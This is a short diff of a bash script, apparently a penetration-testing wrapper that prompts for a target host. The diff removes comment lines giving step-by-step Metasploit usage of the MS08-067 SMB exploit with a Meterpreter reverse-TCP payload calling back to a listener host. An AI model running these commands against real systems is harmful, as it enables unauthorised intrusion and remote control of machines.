@@ -1,13 +1,5 @@
 #!/bin/bash
 
-# Manual usage example: 
-# use exploit/windows/smb/ms08_067_netapi
-# set RHOST 192.168.1.20
-# set PAYLOAD windows/meterpreter/reverse_tcp
-# set LHOST 192.168.1.10
-# set LPORT 4444
-# exploit -j -z
-
 ask_input() {
   read -p "Enter the target IP or hostname: " target
 }
